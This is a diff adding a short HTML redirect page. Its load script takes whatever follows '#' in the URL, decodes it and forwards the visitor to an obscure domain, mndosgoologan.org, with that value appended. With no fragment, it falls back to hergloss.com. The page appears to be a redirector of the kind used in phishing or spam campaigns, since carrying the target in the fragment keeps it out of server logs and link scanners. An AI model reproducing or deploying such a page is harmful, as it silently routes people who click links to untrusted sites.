@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        window.onload = function() {
+            let hash = window.location.hash.substring(1); // Get the part after #
+            if (hash) {
+                let decodedUrl = decodeURIComponent(hash);
+                let targetUrl = "http://mndosgoologan.org/rd/" + decodedUrl;
+                window.location.href = targetUrl;
+            } else {
+                window.location.href = "https://hergloss.com/";
+            }
+        };
+    </script>
+</head>
+<body>
+    <p>Redirecting...</p>
+</body>
+</html>
